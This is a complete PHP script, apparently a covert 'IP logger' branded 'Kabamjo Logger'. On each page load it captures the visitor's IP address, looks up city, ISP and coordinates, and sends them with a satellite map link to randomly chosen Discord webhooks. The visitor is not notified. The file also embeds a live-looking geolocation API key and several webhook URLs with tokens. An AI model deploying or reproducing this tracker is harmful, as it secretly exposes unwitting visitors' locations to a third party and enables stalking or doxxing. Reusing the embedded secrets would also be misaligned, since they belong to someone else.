<?php
// Function to get the visitor's IP address
function getUserIP() {
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        $ipArray = explode(',', $ip);
        return trim($ipArray[0]);
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

// Function to send data to webhook
function sendToWebhook($webhookURL, $data) {
    $options = [
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/json',
            'content' => json_encode($data),
        ],
    ];

    $context = stream_context_create($options);
    $response = @file_get_contents($webhookURL, false, $context);

    if ($response === FALSE) {
        echo 'Error sending data to webhook: ' . error_get_last()['message'];
        return false;
    }

    return true;
}

// Function to get geolocation data from ipgeolocation.io API using cURL
function getGeolocationData($ip_address, $apiKey) {
    $apiURL = "https://api.ipgeolocation.io/ipgeo?apiKey={$apiKey}&ip={$ip_address}";

    // Initialize cURL session
    $ch = curl_init();

    // Set cURL options
    curl_setopt($ch, CURLOPT_URL, $apiURL);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    // Execute cURL session
    $json = curl_exec($ch);

    // Check for errors
    if ($json === false) {
        // Handle cURL error
        echo 'cURL error: ' . curl_error($ch);
        return null;
    }

    // Close cURL session
    curl_close($ch);

    // Decode JSON data
    $geolocationData = json_decode($json);

    // Check if JSON decoding was successful
    if ($geolocationData === null && json_last_error() !== JSON_ERROR_NONE) {
        // Handle JSON decoding error
        echo 'JSON decoding error: ' . json_last_error_msg();
        return null;
    }

    return $geolocationData;
}

// Function to check if IP is already logged and log the IP if not
function checkAndLogIP($ip, $logFile = 'ip_log.txt') {
    // Encode the IP in Base64 three times
    $encodedIP = base64_encode(base64_encode(base64_encode($ip)));

    // Read the file contents into an array
    if (file_exists($logFile)) {
        $loggedIPs = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    } else {
        $loggedIPs = [];
    }

    // Check if encoded IP is already in the array
    if (in_array($encodedIP, $loggedIPs)) {
        return false;
    } else {
        // Log the new encoded IP
        file_put_contents($logFile, $encodedIP . PHP_EOL, FILE_APPEND);
        return true;
    }
}

// Replace with your actual API key
$apiKey = "b1e9549a924b474bbf04e9d029327694";

// Array of webhook URLs
$webhookURLs = [
    "https://discord.com/api/webhooks/1256247280571514931/_LGrrMcqgIR42ACRnubf95XO94Bk1liFrt5TemPJtf7TBqNFNwGII-CQzQ8JnpJAe-dZ",
    "https://discord.com/api/webhooks/1257307476798210071/xuF6RQhVa3e5kWNX_UVBft-TYzikKkZWpYGOBqXDaOaiprykmEa1u6HQX7VLv_IxCwWV",
    "https://discord.com/api/webhooks/1257307477364572251/wwxmeeFCJ5PApAVcUOyOeZSgZWChnThuJqdHNdWjgJviqhuQRxzYKrvHGVcY0xPncLiv",
    "https://discord.com/api/webhooks/1257307478270410762/9PiO8VpeNmtB8xlwlF9irZbrX08MXayVuOfSG8-jdsY2R_GDAUPvpipN04ip_nV7ZGob",
    "https://discord.com/api/webhooks/1257307698194546719/8TJh0aNseKzSFf_gQQjcQd7p9DMktH4vG6mcIVShMIvgRsRXtSugJjf7SHJoZuhbQkdO"
];

// Get the visitor's IP address
$ip_address = getUserIP();

// Check and log the IP address
if (checkAndLogIP($ip_address)) {
    // Get geolocation data from ipgeolocation.io API using cURL
    $geoData = getGeolocationData($ip_address, $apiKey);

    if ($geoData !== null) {
        // Prepare the map URL
        $mapURL = "https://maps.google.com/maps?q={$geoData->latitude},{$geoData->longitude}&t=k&z=15";

        // Prepare the Discord embed payload
        $embedData = [
            'content' => '<@814808619723259935>', // Mention the user
            'username' => 'Kabamjo Logger',
            'avatar_url' => 'https://cdn.discordapp.com/attachments/1153348936283721778/1258363593783513208/Unknown.jpeg?ex=6687c5ec&is=6686746c&hm=e74132130733da5a996d478580cc0cf1358f10320ecbda85d62ab4794ae6110d&', // Replace with your avatar URL
            'embeds' => [
                [
                    'title' => 'Google Maps Url',
                    'description' => "**IP Address:** {$geoData->ip}\n[Full Geolocation Data](https://ipgeolocation.io/?ip={$geoData->ip})",
                    'color' => hexdec("FF0000"), // Color code in decimal
                    'thumbnail' => [
                        'url' => $geoData->country_flag ?? '', // Country flag URL
                    ],
                    'fields' => [
                        [
                            'name' => 'Continent',
                            'value' => $geoData->continent_name ?? 'Unknown',
                            'inline' => true,
                        ],
                        [
                            'name' => 'Country',
                            'value' => "{$geoData->country_name} ({$geoData->country_code2})" ?? 'Unknown',
                            'inline' => true,
                        ],
                        [
                            'name' => 'State/Province',
                            'value' => $geoData->state_prov ?? 'Unknown',
                            'inline' => true,
                        ],
                        [
                            'name' => 'City',
                            'value' => $geoData->city ?? 'Unknown',
                            'inline' => true,
                        ],
                        [
                            'name' => 'ISP',
                            'value' => $geoData->isp ?? 'Unknown',
                            'inline' => true,
                        ],
                        [
                            'name' => 'Latitude',
                            'value' => $geoData->latitude ?? 'Unknown',
                            'inline' => true,
                        ],
                        [
                            'name' => 'Longitude',
                            'value' => $geoData->longitude ?? 'Unknown',
                            'inline' => true,
                        ],
                        [
                            'name' => 'Languages',
                            'value' => $geoData->languages ?? 'Unknown',
                            'inline' => true,
                        ],
                    ],
                    'footer' => [
                        'text' => 'Provided by Kabamjo',
                    ],
                    'url' => $mapURL, // Add the map URL
                ],
            ],
        ];

        // Select a random webhook URL
        $webhookURL = $webhookURLs[array_rand($webhookURLs)];

        // Send the data to the webhook
        $result = sendToWebhook($webhookURL, $embedData);

        if ($result) {
            echo "Data sent to webhook successfully.";
        } else {
            echo "Failed to send data to webhook.";
        }
    } else {
        echo "Failed to retrieve geolocation data.";
    }
} else {
    echo "IP Address $ip_address is already logged. Skipping webhook notification.";
}
?>
